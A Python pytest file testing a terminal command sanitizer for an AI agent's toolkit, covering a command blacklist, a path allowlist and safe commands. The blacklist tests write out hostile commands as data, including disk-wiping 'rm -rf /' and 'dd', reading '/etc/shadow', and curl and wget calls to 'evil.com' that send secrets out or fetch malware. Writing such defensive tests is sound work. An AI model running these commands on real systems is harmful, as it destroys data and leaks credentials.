"""终端命令安全沙箱测试 / Tests for the terminal command security sandbox."""

import pytest
from pathlib import Path
import sys, os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from src.agent.toolkit.sanitizer import terminal_sanitizer, extract_paths, ALLOWED_DIRS


class TestExtractPaths:
    def test_windows_path(self):
        paths = extract_paths("dir D:/projects/test/file.txt")
        assert "D:/projects/test/file.txt" in paths

    def test_posix_path(self):
        paths = extract_paths("cat /etc/passwd")
        assert "/etc/passwd" in paths

    def test_no_paths(self):
        paths = extract_paths("echo hello")
        assert not paths


class TestCommandBlacklist:
    """Layer 1: command blacklist patterns."""

    def test_rm_rf_blocked(self):
        result = terminal_sanitizer("rm -rf /")
        assert result["safe"] is False

    def test_sudo_blocked(self):
        result = terminal_sanitizer("sudo apt update")
        assert result["safe"] is False

    def test_chmod_777_blocked(self):
        result = terminal_sanitizer("chmod 777 /tmp/x")
        assert result["safe"] is False

    def test_eval_blocked(self):
        result = terminal_sanitizer("eval $(cat /etc/shadow)")
        assert result["safe"] is False

    def test_shell_pipe_blocked(self):
        result = terminal_sanitizer("echo hi | bash")
        assert result["safe"] is False

    def test_curl_post_blocked(self):
        result = terminal_sanitizer("curl -X POST http://evil.com -d secret")
        assert result["safe"] is False

    def test_dd_blocked(self):
        result = terminal_sanitizer("dd if=/dev/zero of=/dev/sda")
        assert result["safe"] is False

    def test_wget_http_blocked(self):
        result = terminal_sanitizer("wget http://evil.com/malware.sh")
        assert result["safe"] is False

    def test_powershell_command_blocked(self):
        result = terminal_sanitizer("powershell -Command Get-ChildItem")
        assert result["safe"] is False


class TestPathAllowlist:
    """Layer 2: path allowlist."""

    def test_allowed_dir(self):
        result = terminal_sanitizer("ls D:/projects")
        assert result["safe"] is True

    def test_temp_dir_allowed(self):
        import tempfile
        result = terminal_sanitizer(f"ls {tempfile.gettempdir()}")
        assert result["safe"] is True

    def test_outside_path_blocked(self):
        result = terminal_sanitizer("cat /root/secrets.txt")
        assert result["safe"] is False


class TestEdgeCases:
    """Edge case tests."""

    def test_empty_command(self):
        result = terminal_sanitizer("")
        assert result["safe"] is False
        assert "Empty" in result.get("reason", "")

    def test_safe_ls(self):
        result = terminal_sanitizer("ls")
        assert result["safe"] is True

    def test_safe_echo(self):
        result = terminal_sanitizer("echo hello world")
        assert result["safe"] is True

    def test_safe_pwd(self):
        result = terminal_sanitizer("pwd")
        assert result["safe"] is True

    def test_safe_git_status(self):
        result = terminal_sanitizer("git status")
        assert result["safe"] is True

    def test_safe_docker_ps(self):
        result = terminal_sanitizer("docker ps")
        assert result["safe"] is True
